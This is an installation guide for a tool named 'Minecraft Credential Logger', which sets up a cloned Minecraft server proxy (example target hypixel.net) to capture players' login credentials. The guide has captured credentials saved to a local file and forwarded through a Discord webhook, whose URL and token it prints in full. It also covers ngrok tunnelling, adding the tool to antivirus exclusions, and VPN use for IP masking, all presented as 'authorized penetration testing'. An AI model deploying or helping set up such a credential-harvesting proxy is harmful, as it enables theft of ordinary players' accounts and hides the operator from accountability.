# Installation Guide

This guide will help you set up **Minecraft Credential Logger** on your system for authorized penetration testing.

## 📋 System Requirements

### Minimum Requirements
- **Operating System**: Windows 10/11, macOS 10.15+, or Linux (Ubuntu 18.04+)
- **Node.js**: Version 18.0.0 or higher
- **Java**: Version 17 or higher (for Velocity proxy)
- **RAM**: 2GB available memory
- **Storage**: 1GB free disk space
- **Network**: Stable internet connection for ngrok tunneling

### Recommended Requirements
- **Node.js**: Latest LTS version (20.x)
- **Java**: OpenJDK 21 or Oracle JDK 21
- **RAM**: 4GB+ available memory
- **CPU**: Multi-core processor for better performance
- **Network**: 25+ Mbps for optimal tunnel performance

## 🔧 Pre-Installation Setup

### 1. Install Node.js

#### Windows
1. Download Node.js from [nodejs.org](https://nodejs.org/)
2. Run the installer and follow the setup wizard
3. Verify installation:
   ```powershell
   node --version
   npm --version
   ```

#### macOS
```bash
# Using Homebrew (recommended)
brew install node

# Or download from nodejs.org and install manually
```

#### Linux (Ubuntu/Debian)
```bash
# Update package list
sudo apt update

# Install Node.js via NodeSource repository
curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verify installation
node --version
npm --version
```

### 2. Install Java

#### Windows
1. Download OpenJDK from [adoptium.net](https://adoptium.net/)
2. Install and add to PATH environment variable
3. Verify installation:
   ```powershell
   java --version
   ```

#### macOS
```bash
# Using Homebrew (recommended)
brew install openjdk@21

# Add to PATH (add to ~/.zshrc or ~/.bash_profile)
export PATH="/opt/homebrew/opt/openjdk@21/bin:$PATH"
source ~/.zshrc
```

#### Linux
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install openjdk-21-jdk

# CentOS/RHEL/Fedora
sudo dnf install java-21-openjdk-devel

# Verify installation
java --version
```

## 📦 Installation Steps

### 1. Clone the Repository

```bash
# Clone from GitHub
git clone https://github.com/itsreyi/Minecraft-Credential-Logger.git

# Navigate to project directory
cd Minecraft-Credential-Logger
```

### 2. Install Dependencies

```bash
# Install all required Node.js packages
npm install
```

This will install the following dependencies:
- **electron**: Desktop application framework (v27.0.0)
- **minecraft-protocol**: Minecraft server communication library
- **axios**: HTTP client for Discord webhook integration

### 3. Verify Velocity Components

The Velocity proxy server and plugins are automatically downloaded on first run. The `velocity-server/` directory structure:

```
velocity-server/
├── velocity.jar              # Velocity 3.3.0-436 (auto-downloaded)
├── velocity.toml             # Proxy configuration (auto-generated)
├── forwarding.secret         # Security key (auto-generated)
├── plugins/                  # Plugin directory
│   ├── ViaVersion.jar       # Version compatibility (auto-downloaded)
│   └── ViaBackwards.jar     # Legacy support (auto-downloaded)
└── logs/                     # Runtime logs
    └── latest.log           # Current session log
```

### 4. Configure Discord Webhook (Optional)

For real-time credential notifications:

1. **Create Discord Webhook**:
   - Go to your Discord server settings
   - Navigate to Integrations → Webhooks
   - Create new webhook and copy the URL

2. **Update Configuration**:
   - Open `minecraft-cloner.js` in a text editor
   - Find line ~15 in the `DiscordWebhook` class:
   ```javascript
   this.webhookUrl = 'https://discord.com/api/webhooks/1425884465346908330/2BpSzSOr_DNyPtWsAKkdgolpufhCI0os3nTGZj_ImV3NsQwZoDdRa6vr8xdJsrKbdBSA';
   ```
   - Replace with your webhook URL
   - Set `this.enabled = true;` to enable notifications

### 5. Install ngrok (Optional but Recommended)

For public server access without port forwarding:

#### Windows
```powershell
# Using Chocolatey
choco install ngrok

# Or download from https://ngrok.com/download
```

#### macOS
```bash
# Using Homebrew
brew install ngrok/ngrok/ngrok

# Or download from https://ngrok.com/download
```

#### Linux
```bash
# Download and install
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok
```

## 🚀 First Launch

### 1. Start the Application

```bash
# Launch GUI application
npm start

# Development mode with DevTools
npm run dev

# Console-only mode (example)
npm run console hypixel.net 25565
```

### 2. Initial Setup Verification

Upon first launch, the application should:

1. **Open GUI Interface**: Dark-themed Electron window
2. **Display Console**: System initialization messages
3. **Show Sidebar**: Server configuration panel
4. **Initialize Components**: Velocity auto-download and setup

Expected console output:
```
[SISTEMA] 🎯 CREDENTIAL LOGGER pronto all'uso
[INFO] Inserisci un server target e clicca "Avvia Cloner"
```

## 🔍 Troubleshooting

### Common Installation Issues

#### Node.js Version Error
```
Error: This version of Node.js requires a newer version
```
**Solution**: 
1. Uninstall old Node.js version
2. Install Node.js 18+ from [nodejs.org](https://nodejs.org/)
3. Restart terminal/command prompt

#### Java Not Found
```
'java' is not recognized as an internal or external command
```
**Solution**: 
1. Verify Java installation: `java --version`
2. Add Java to system PATH:
   - Windows: System Properties → Environment Variables
   - macOS/Linux: Add to shell profile (`.bashrc`, `.zshrc`)
3. Restart terminal

#### Permission Denied (Port Binding)
```
Error: EACCES: permission denied, bind
```
**Solution**: 
- **Windows**: Run as Administrator
- **macOS/Linux**: Use `sudo` for ports < 1024 or change default port

#### Electron Installation Failed
```
Error: Failed to download electron
```
**Solution**: 
1. Clear npm cache: `npm cache clean --force`
2. Delete node_modules: `rm -rf node_modules`
3. Reinstall: `npm install --verbose`
4. Alternative registry: `npm install --registry https://registry.npmmirror.com`

#### Velocity Download Issues
```
Error downloading Velocity
```
**Solution**: 
1. Check internet connection
2. Verify firewall allows HTTPS connections
3. Manual download: Place `velocity.jar` in `velocity-server/` directory
4. Restart application

### Platform-Specific Issues

#### Windows
- **Antivirus Interference**: Add project directory to exclusions
- **Windows Defender**: May quarantine ngrok - add exception
- **PowerShell Policy**: Run `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser`
- **Port Conflicts**: Check for existing Minecraft servers on port 25565

#### macOS
- **Gatekeeper**: Allow unknown developer in Security & Privacy
- **Homebrew Issues**: Update brew: `brew update && brew upgrade`
- **Permission Errors**: Grant terminal full disk access in Privacy settings

#### Linux
- **Package Dependencies**: Install build tools:
  ```bash
  # Ubuntu/Debian
  sudo apt install build-essential python3-dev
  
  # CentOS/RHEL
  sudo dnf groupinstall "Development Tools"
  ```
- **Firewall**: Configure UFW to allow necessary ports
- **AppArmor/SELinux**: May restrict Java execution

## 🔒 Security Setup

### Firewall Configuration

#### Windows Firewall
```powershell
# Allow Node.js
New-NetFirewallRule -DisplayName "Node.js" -Direction Inbound -Program "C:\Program Files\nodejs\node.exe" -Action Allow

# Allow Java
New-NetFirewallRule -DisplayName "Java" -Direction Inbound -Program "C:\Program Files\Java\jdk-21\bin\java.exe" -Action Allow
```

#### Linux iptables/UFW
```bash
# UFW (Ubuntu)
sudo ufw allow 25565/tcp
sudo ufw allow out 443/tcp
sudo ufw allow out 80/tcp

# iptables
sudo iptables -A INPUT -p tcp --dport 25565 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
```

### Antivirus Exclusions

Add these paths to antivirus exclusions:
- **Project Directory**: Full path to `Minecraft-Credential-Logger/`
- **Node.js**: `C:\Program Files\nodejs\` (Windows)
- **Java Runtime**: Java installation directory
- **Velocity JAR**: `velocity-server/velocity.jar`
- **ngrok**: ngrok installation directory

### VPN Configuration (Recommended)

For authorized penetration testing:
1. Use a reputable VPN service
2. Connect before launching the application
3. Verify IP masking: `curl ipinfo.io`
4. Document testing infrastructure for reporting

## 📁 Complete Directory Structure

After successful installation:

```
Minecraft-Credential-Logger/
├── assets/
│   └── Logo.png                    # Application logo (128x128 PNG)
├── renderer/                       # Electron frontend
│   ├── index.html                 # Main GUI interface
│   ├── styles.css                 # Dark theme CSS
│   └── renderer.js                # Frontend JavaScript
├── velocity-server/               # Minecraft proxy (auto-created)
│   ├── velocity.jar              # Velocity 3.3.0-436
│   ├── velocity.toml             # Proxy configuration
│   ├── forwarding.secret         # Security configuration
│   ├── plugins/                  # Compatibility plugins
│   │   ├── ViaVersion.jar       # Version translation
│   │   └── ViaBackwards.jar     # Legacy support
│   └── logs/                     # Runtime logs
│       ├── latest.log           # Current session
│       └── *.log.gz             # Archived logs
├── main.js                       # Electron main process
├── minecraft-cloner.js           # Core cloning engine
├── package.json                  # Project configuration
├── captured_credentials.json     # Credential storage (runtime)
├── README.md                     # Project documentation
├── INSTALLATION.md               # This installation guide
└── WIKI.md                       # Usage documentation
```

## 🔄 Post-Installation Tasks

### 1. Verify System Health

Run the built-in system check:
```bash
# Start application and check console for any warnings
npm start

# Check Java integration
npm run console --version

# Verify dependencies
npm list --depth=0
```

### 2. Update Components

Keep components up to date:
```bash
# Update Node.js dependencies
npm update

# Update npm itself
npm install -g npm@latest

# Check for Velocity updates (manual)
# Latest version info at: https://papermc.io/downloads/velocity
```

### 3. Backup Configuration

Create configuration backups:
```bash
# Backup current configuration
cp velocity-server/velocity.toml velocity-server/velocity.toml.backup

# Backup Discord webhook settings
grep -n "webhookUrl" minecraft-cloner.js > webhook-config-backup.txt
```

## 🆘 Getting Help

### Self-Diagnosis Checklist

Before seeking help, verify:
- [ ] Node.js 18+ installed and in PATH
- [ ] Java 17+ installed and in PATH
- [ ] All dependencies installed (`npm list`)
- [ ] No firewall blocking necessary ports
- [ ] Internet connection stable
- [ ] Adequate disk space (1GB+)
- [ ] No conflicting Minecraft servers running

### Support Resources

1. **Documentation**: Read [WIKI.md](WIKI.md) for usage help
2. **GitHub Issues**: Search existing issues or create new one
3. **System Logs**: Check console output and `velocity-server/logs/`
4. **Community**: Join discussions for general questions

### Bug Report Template

When creating GitHub issues, include:

```markdown
**System Information:**
- OS: [Windows 11/macOS 14/Ubuntu 22.04]
- Node.js: [output of `node --version`]
- Java: [output of `java --version`]
- NPM: [output of `npm --version`]

**Error Details:**
- Full error message: [copy exact error]
- Steps to reproduce: [list steps]
- Expected behavior: [what should happen]
- Console output: [relevant logs]

**Additional Context:**
- First time setup or existing installation?
- Any antivirus/firewall software?
- VPN or proxy in use?
- Modified any configuration files?
```

## 🎯 Next Steps

After successful installation:

1. **Read Usage Guide**: See [WIKI.md](WIKI.md) for operational instructions
2. **Legal Verification**: Ensure proper authorization for target testing
3. **Test Setup**: Try with your own Minecraft server first
4. **Configure Notifications**: Set up Discord webhooks if needed
5. **Security Review**: Verify VPN and anonymization tools

---

**Installation Complete! Ready for authorized penetration testing.**

For usage instructions, continue to [WIKI.md](WIKI.md).